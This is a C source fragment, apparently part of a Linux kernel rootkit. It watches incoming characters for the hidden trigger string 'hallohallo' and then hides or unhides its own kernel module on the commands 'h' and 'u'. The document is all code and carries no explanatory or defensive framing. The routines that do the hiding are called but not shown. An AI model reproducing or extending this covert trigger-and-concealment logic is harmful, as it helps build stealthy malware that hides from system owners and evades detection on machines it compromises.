char activate_pattern[] = "hallohallo";
int size_of_pattern = sizeof(activate_pattern)-1;
int cur_position = 0;
int last_match = -1;

static void handleChar(char c){
    if(c=='\n' || c == '\r'){ //cancel command with newline
//        OUR_DEBUG("newline");
        last_match = -1;
        cur_position = 0;
    } else if (last_match == size_of_pattern-1) { //activate pattern matched, read the actual control command
        if(c == 'h'){ //hide
            OUR_DEBUG("HIDE THIS MODULE");
            hide_me();
            last_match = -1;
            cur_position = 0;
        } else if(c == 'u') { //unhide
            OUR_DEBUG("UNHIDE THIS MODULE");
            unhide_me();
            last_match = -1;
            cur_position = 0;
        } else {
            //ignore everything else and wait for a valid command
        }
    } else if(last_match+1 == cur_position){ // activate_pattern matched until last_match, now we compare with last_match + 1
        if(c == activate_pattern[cur_position]) { // match further
//            OUR_DEBUG("match %c", c);
            last_match++;
            cur_position++;
        } else if(c == 127 || c == '\b') { // backspace (why would one want to do this is this case?)
//            OUR_DEBUG("backspace but right");
            if(cur_position != 0){
                last_match--;
                cur_position--;
            }
        } else { // wrong char
//            OUR_DEBUG("no match: %c, expected %c", c, activate_pattern[cur_position]);
            cur_position++;
        }
    } else { // the previous chars don't match, but there might be backspaces and therefore we count the read input up and down
        if(c == 127 || c == '\b'){
//            OUR_DEBUG("backspace wrong");
            if(cur_position != 0){
                cur_position--;
            }
        } else {
//            OUR_DEBUG("wrong char: %c (as int: %d)", c, (int)c);
            cur_position++;
        }
    }
}

static void handle_input(char *buf, int count)
{
    int i;
    for(i = 0; i<count; i++){
        handleChar(buf[i]);
    }
}
